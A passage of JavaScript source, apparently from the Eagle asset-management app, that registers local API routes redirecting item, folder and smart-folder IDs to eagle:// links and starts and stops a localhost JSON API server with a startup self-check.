                    res.writeHead(302, { 'Location': `eagle://item/${itemID}` });
                    res.end();
                }
                else {
                    res.writeHead(404, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'File does not exist.' }));
                }
            });
        });

        APIServer.addHandler('/folder', (args, res) => {
            return new Promise((resolve, reject) => {
                const folderID = args.id;
                if (folderID && $bodyScope.folderMappings[folderID]) {
                    res.writeHead(302, { 'Location': `eagle://folder/${folderID}` });
                    res.end();
                }
                else {
                    res.writeHead(404, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'Folder does not exist.' }));
                }
            });
        });

        APIServer.addHandler('/smart-folder', (args, res) => {
            return new Promise((resolve, reject) => {
                const folderID = args.id;
                if (folderID && $bodyScope.smartFolderMappings[folderID]) {
                    res.writeHead(302, { 'Location': `eagle://smart-folder/${folderID}` });
                    res.end();
                }
                else {
                    res.writeHead(404, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'Smart Folder does not exist.' }));
                }
            });
        });

        // V2 API
        require(appRoot + '/app/js/api-server-v2').initAPIServerV2(APIServer);

    }
    catch (err) {
        console.error(err);
    }
}

function startAPIServer () {
    try {
        APIServer.start( () => {
            console.log('JSON API server started.');
            console.log(`try GET to access http://localhost:41595/`);

            setTimeout(() => {
                const xhr = new XMLHttpRequest();
                xhr.open("GET", `http://localhost:41595/`, true);
                xhr.onreadystatechange = () => {
                    console.log(xhr);
                    
                    if (xhr.responseURL === "" && xhr.status == 0) {
                        electronLog.info("[app] API server start fail[1].");
                        stopAPIServer();
                    }
                }
                xhr.onerror = () => {}
                xhr.send();
            }, 5000);
        });
    }
    catch (err) {}
}

function stopAPIServer () {
    try {
        APIServer.stop();
        console.log('JSON API server stopped.');
    }
    catch (err) {}
}